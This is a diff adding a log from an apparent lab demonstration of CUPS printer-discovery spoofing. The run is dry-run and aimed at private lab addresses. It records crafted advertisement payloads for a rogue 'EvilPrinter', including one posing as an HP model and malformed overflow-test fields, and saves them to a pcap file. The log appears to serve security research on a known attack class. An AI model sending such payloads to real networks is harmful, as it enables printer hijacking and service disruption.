@@ -1,0 +1,14 @@
+2026-11-08 15:11:05,255 [INFO] CUPS discovery demonstration started at 2026-11-08 15:11:05.255880
+2026-11-08 15:11:05,256 [INFO] Target: 192.168.56.20:631  Advertised printer: ipp://192.168.56.10:8631/printers/EvilPrinter
+2026-11-08 15:11:05,256 [INFO] DRY-RUN: packets will be crafted/saved but NOT transmitted.
+2026-11-08 15:11:05,256 [INFO] [baseline] round 1 payload: 0x00000000 0x3 ipp://192.168.56.10:8631/printers/EvilPrinter "Lab" "Rogue printer" "Rogue IPP Everywhere"
+2026-11-08 15:11:06,259 [INFO] [baseline] round 2 payload: 0x00000000 0x3 ipp://192.168.56.10:8631/printers/EvilPrinter "Lab" "Rogue printer" "Rogue IPP Everywhere"
+2026-11-08 15:11:07,264 [INFO] [baseline] round 3 payload: 0x00000000 0x3 ipp://192.168.56.10:8631/printers/EvilPrinter "Lab" "Rogue printer" "Rogue IPP Everywhere"
+2026-11-08 15:11:07,266 [INFO] [alt-port-spoofed-model] round 1 payload: 0x00000000 0x5 ipp://192.168.56.10:9100/printers/EvilPrinter "Office" "Trusted device" "HP Color LaserJet MFP"
+2026-11-08 15:11:08,271 [INFO] [alt-port-spoofed-model] round 2 payload: 0x00000000 0x5 ipp://192.168.56.10:9100/printers/EvilPrinter "Office" "Trusted device" "HP Color LaserJet MFP"
+2026-11-08 15:11:09,277 [INFO] [alt-port-spoofed-model] round 3 payload: 0x00000000 0x5 ipp://192.168.56.10:9100/printers/EvilPrinter "Office" "Trusted device" "HP Color LaserJet MFP"
+2026-11-08 15:11:09,279 [INFO] [malformed-fields] round 1 payload: 0xffffffff 0x7f ipp://192.168.56.10:8631/printers/EvilPrinter "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "overflowtest" "X"
+2026-11-08 15:11:10,284 [INFO] [malformed-fields] round 2 payload: 0xffffffff 0x7f ipp://192.168.56.10:8631/printers/EvilPrinter "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "overflowtest" "X"
+2026-11-08 15:11:11,285 [INFO] [malformed-fields] round 3 payload: 0xffffffff 0x7f ipp://192.168.56.10:8631/printers/EvilPrinter "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "overflowtest" "X"
+2026-11-08 15:11:11,295 [INFO] Wrote 9 packet(s) to pcap_files/attack_variations.pcap
+2026-11-08 15:11:11,295 [INFO] Done. 9 advertisement packet(s) processed.
